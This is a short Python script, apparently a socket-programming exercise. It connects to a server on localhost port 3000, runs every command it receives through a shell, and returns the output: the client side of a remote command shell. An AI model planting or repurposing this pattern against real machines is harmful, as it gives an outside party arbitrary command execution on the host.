import socket
import subprocess

sk = socket.socket()
sk.connect(('127.0.0.1',3000))

while True:
    cmd=sk.recv(1024).decode('gbk')
    ret=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    std_out = ret.stdout.read().decode('gbk')
    std_err= ret.stderr.read().decode("gbk")
    print(std_out)
    print(std_err)
    sk.send(std_out.encode('utf-8'))
    sk.send(std_err.encode('utf-8'))
sk.close()